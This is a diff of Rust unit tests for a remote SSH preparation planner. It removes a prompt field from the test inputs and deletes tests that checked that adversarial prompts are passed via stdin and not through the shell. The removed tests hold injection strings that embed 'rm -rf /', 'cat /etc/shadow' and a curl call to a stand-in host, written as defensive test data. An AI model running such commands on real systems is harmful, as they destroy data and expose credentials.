@@ -100,7 +100,6 @@ fn plan_uses_ssh_t_not_tt() {
             is_dirty: false,
             not_on_default: false,
             origin_mismatch: false,
-            prompt: "do the work",
         })
         .value_or_panic("plan");
     assert!(!ops.is_empty());
@@ -130,7 +129,6 @@ fn plan_targets_remote_host_user() {
             is_dirty: false,
             not_on_default: false,
             origin_mismatch: false,
-            prompt: "do the work",
         })
         .value_or_panic("plan");
     assert!(!ops.is_empty());
@@ -155,7 +153,6 @@ fn plan_applies_run_as_user() {
             is_dirty: false,
             not_on_default: false,
             origin_mismatch: false,
-            prompt: "do the work",
         })
         .value_or_panic("plan");
     // run_as_user=acoliver differs from login_user=ubuntu → every command
@@ -176,8 +173,9 @@ fn plan_applies_run_as_user() {
 }
 
 #[test]
-fn plan_prompt_transferred_via_stdin_not_shell() {
-    let adversarial = "'; rm -rf /; echo '";
+fn plan_does_not_write_prompt_to_disk() {
+    // Issue #315: the prompt content is inlined into the launch instruction
+    // (-i), so no op should carry stdin_prompt bytes (no `cat > file`).
     let planner = RemotePrepPlanner::new(remote_settings());
     let ops = planner
         .plan(&PlanInputs {
@@ -188,23 +186,12 @@ fn plan_prompt_transferred_via_stdin_not_shell() {
             is_dirty: false,
             not_on_default: false,
             origin_mismatch: false,
-            prompt: adversarial,
         })
         .value_or_panic("plan");
-    // The final op writes the prompt via stdin.
-    let prompt_op = ops
-        .iter()
-        .find(|op| op.stdin_prompt.is_some())
-        .unwrap_or_else(|| panic!("an op must carry the prompt via stdin (got {ops:?})"));
-    assert_eq!(prompt_op.stdin_prompt.as_deref(), Some(adversarial));
-    // The command string must NOT contain the raw adversarial prompt —
-    // it is transferred via stdin, not interpolated.
-    for arg in &prompt_op.ssh_argv {
-        assert!(
-            !arg.contains("rm -rf"),
-            "adversarial prompt must not appear in shell argv (got {arg})"
-        );
-    }
+    assert!(
+        ops.iter().all(|op| op.stdin_prompt.is_none()),
+        "no op should carry a prompt via stdin (issue #315 inlines the prompt): {ops:?}"
+    );
 }
 
 #[test]
@@ -225,7 +212,6 @@ fn plan_does_not_create_local_workdir() {
             is_dirty: false,
             not_on_default: false,
             origin_mismatch: false,
-            prompt: "prompt",
         })
         .value_or_panic("plan");
     assert!(
@@ -246,7 +232,6 @@ fn plan_dirty_stop_emits_no_cleanup() {
             is_dirty: true,
             not_on_default: false,
             origin_mismatch: false,
-            prompt: "prompt",
         })
         .value_or_panic("plan");
     // Dirty + Stop: the planner short-circuits with NO operations at all —
@@ -270,7 +255,6 @@ fn plan_dirty_discard_emits_cleanup_then_prep() {
             is_dirty: true,
             not_on_default: false,
             origin_mismatch: false,
-            prompt: "prompt",
         })
         .value_or_panic("plan");
     // Discard: reset --hard + clean -fd first, then checkout, then prompt.
@@ -282,12 +266,7 @@ fn plan_dirty_discard_emits_cleanup_then_prep() {
         .iter()
         .position(|op| op.ssh_argv.iter().any(|a| a.contains("git checkout")))
         .value_or_panic("a checkout op must be planned");
-    let prompt_idx = ops
-        .iter()
-        .position(|op| op.stdin_prompt.is_some())
-        .value_or_panic("a prompt-write op must be planned");
     assert!(reset_idx < checkout_idx, "reset before checkout");
-    assert!(checkout_idx < prompt_idx, "checkout before prompt write");
 }
 
 #[test]
@@ -302,7 +281,6 @@ fn plan_clone_when_missing() {
             is_dirty: false,
             not_on_default: false,
             origin_mismatch: false,
-            prompt: "prompt",
         })
         .value_or_panic("plan");
     assert!(
@@ -324,7 +302,7 @@ fn plan_clone_when_missing() {
 fn plan_absent_without_identity_emits_no_ops() {
     // When the workdir is absent AND no clone identity is available, the
     // live runner returns Err. The planner must mirror that by emitting NO
-    // ops — it must not plan checkout/prompt-write operations against a
+    // ops — it must not plan checkout operations against a
     // path that was never created.
     let planner = RemotePrepPlanner::new(remote_settings());
     let ops = planner
@@ -336,7 +314,6 @@ fn plan_absent_without_identity_emits_no_ops() {
             is_dirty: false,
             not_on_default: false,
             origin_mismatch: false,
-            prompt: "prompt",
         })
         .value_or_panic("plan");
     assert!(
@@ -359,7 +336,6 @@ fn plan_https_url_regardless_of_remote_enabled() {
             is_dirty: false,
             not_on_default: false,
             origin_mismatch: false,
-            prompt: "prompt",
         })
         .value_or_panic("plan");
     let clone_op = ops
@@ -396,7 +372,6 @@ fn plan_origin_mismatch_short_circuits() {
             is_dirty: false,
             not_on_default: false,
             origin_mismatch: true,
-            prompt: "prompt",
         })
         .value_or_panic("plan");
     assert!(
@@ -413,7 +388,7 @@ fn plan_force_reclone_resolves_url_before_rm() {
     // BEFORE the rm -rf. The clone URL must appear in a planned op, and the
     // rm must precede the clone (ordering invariant: identity → rm → clone).
     let planner = RemotePrepPlanner::new(remote_settings());
-    let ops = planner.plan_force_reclone(Path::new(PLAN_WORK_DIR), &identity(), "prompt");
+    let ops = planner.plan_force_reclone(Path::new(PLAN_WORK_DIR), &identity());
 
     // Find the rm and clone ops by their position in the plan.
     let rm_idx = ops
@@ -450,16 +425,6 @@ fn plan_force_reclone_resolves_url_before_rm() {
         clone_idx < checkout_idx,
         "clone must precede checkout: {ops:?}"
     );
-
-    // A prompt-write op (stdin) must follow the checkout.
-    let prompt_idx = ops
-        .iter()
-        .position(|op| op.stdin_prompt.is_some())
-        .value_or_panic("a prompt-write op must be planned");
-    assert!(
-        checkout_idx < prompt_idx,
-        "checkout must precede prompt write: {ops:?}"
-    );
 }
 
 #[test]
@@ -477,7 +442,6 @@ fn plan_not_git_is_a_hard_error_not_empty() {
         is_dirty: false,
         not_on_default: false,
         origin_mismatch: false,
-        prompt: "prompt",
     });
     assert!(result.is_err(), "NotGit must be a hard error: {result:?}");
     let err = match result {
@@ -488,93 +452,6 @@ fn plan_not_git_is_a_hard_error_not_empty() {
     assert!(
         err.contains("not a git worktree"),
         "error must explain non-git worktree: {err}"
-    );
-}
-
-// ── Target-aware PR prompt writing (reuses write_prompt_to_target) ──────
-
-/// A remote PR prompt write plans `ssh -T` with prompt bytes via stdin,
-/// transferring adversarial content WITHOUT it appearing in the shell argv.
-/// This uses the pure `RemotePrepPlanner` so no SSH connection is made — it
-/// records the planned operation.
-#[test]
-fn pr_prompt_remote_plan_transfers_prompt_via_stdin_not_shell() {
-    let adversarial = "'; cat /etc/shadow; echo '\n$(curl evil.example.com)";
-    let planner = RemotePrepPlanner::new(remote_settings());
-    let ops = planner
-        .plan(&PlanInputs {
-            work_dir: Path::new(PLAN_WORK_DIR),
-            identity: Some(&identity()),
-            policy: DirtyPolicy::Stop,
-            presence: WorkdirPresence::Git,
-            is_dirty: false,
-            not_on_default: false,
-            origin_mismatch: false,
-            prompt: adversarial,
-        })
-        .value_or_panic("plan");
-    // The final op writes the prompt via stdin.
-    let prompt_op = ops
-        .iter()
-        .find(|op| op.stdin_prompt.is_some())
-        .unwrap_or_else(|| panic!("an op must carry the prompt via stdin (got {ops:?})"));
-    assert_eq!(prompt_op.stdin_prompt.as_deref(), Some(adversarial));
-    // The command argv must NOT contain the raw adversarial prompt.
-    for arg in &prompt_op.ssh_argv {
-        assert!(
-            !arg.contains("/etc/shadow"),
-            "adversarial prompt must not appear in shell argv (got {arg})"
-        );
-        assert!(
-            !arg.contains("evil.example.com"),
-            "adversarial URL must not appear in shell argv (got {arg})"
-        );
-    }
-    // The prompt file path in the argv must be the issue prompt path (the
-    // planner hardcodes it); the PR path uses `write_prompt_to_target`
-    // directly at runtime.
-    assert!(
-        prompt_op
-            .ssh_argv
-            .iter()
-            .any(|a| a.contains(".jefe/issue-prompt.md")),
-        "planned prompt op writes to .jefe/issue-prompt.md"
-    );
-}
-
-/// The remote PR prompt write (via `write_prompt_to_target`) delegates to the
-/// same `RemotePrepRunner::write_prompt` that the issue path uses. Since the
-/// runner is not exposed for direct testing, this verifies the planner's
-/// generic prompt-write op uses `ssh -T` and targets the correct host.
-#[test]
-fn pr_prompt_remote_target_is_correct_ssh_t_host() {
-    let planner = RemotePrepPlanner::new(remote_settings());
-    let ops = planner
-        .plan(&PlanInputs {
-            work_dir: Path::new(PLAN_WORK_DIR),
-            identity: None,
-            policy: DirtyPolicy::Stop,
-            presence: WorkdirPresence::Git,
-            is_dirty: false,
-            not_on_default: false,
-            origin_mismatch: false,
-            prompt: "PR prompt",
-        })
-        .value_or_panic("plan");
-    let prompt_op = ops
-        .iter()
-        .find(|op| op.stdin_prompt.is_some())
-        .unwrap_or_else(|| panic!("prompt op must exist: {ops:?}"));
-    assert!(
-        prompt_op.ssh_argv.iter().any(|a| a == "-T"),
-        "PR prompt remote op must use -T"
-    );
-    assert!(
-        prompt_op
-            .ssh_argv
-            .iter()
-            .any(|a| a == "ubuntu@build.example.com"),
-        "PR prompt remote op must target ubuntu@build.example.com"
     );
 }
 
@@ -594,7 +471,6 @@ fn plan_not_on_default_stop_emits_no_cleanup() {
             is_dirty: false,
             not_on_default: true,
             origin_mismatch: false,
-            prompt: "prompt",
         })
         .value_or_panic("plan");
     assert!(
@@ -604,7 +480,7 @@ fn plan_not_on_default_stop_emits_no_cleanup() {
 }
 
 /// Clean but not on the default branch with Discard: the planner must emit
-/// the checkout script (to switch to the default branch) and the prompt write,
+/// the checkout script (to switch to the default branch),
 /// but NO reset/clean op (the tree is clean, only a branch switch is needed).
 #[test]
 fn plan_not_on_default_discard_emits_checkout_without_cleanup() {
@@ -618,7 +494,6 @@ fn plan_not_on_default_discard_emits_checkout_without_cleanup() {
             is_dirty: false,
             not_on_default: true,
             origin_mismatch: false,
-            prompt: "prompt",
         })
         .value_or_panic("plan");
     assert!(!ops.is_empty(), "Discard must emit checkout + prompt ops");
@@ -638,10 +513,5 @@ fn plan_not_on_default_discard_emits_checkout_without_cleanup() {
         ops.iter()
             .any(|op| { op.ssh_argv.iter().any(|a| a.contains("git fetch origin")) }),
         "Discard must emit a fetch+checkout op: {ops:?}"
-    );
-    // The prompt write op must be present.
-    assert!(
-        ops.iter().any(|op| op.stdin_prompt.is_some()),
-        "Discard must emit a prompt-write op: {ops:?}"
     );
 }
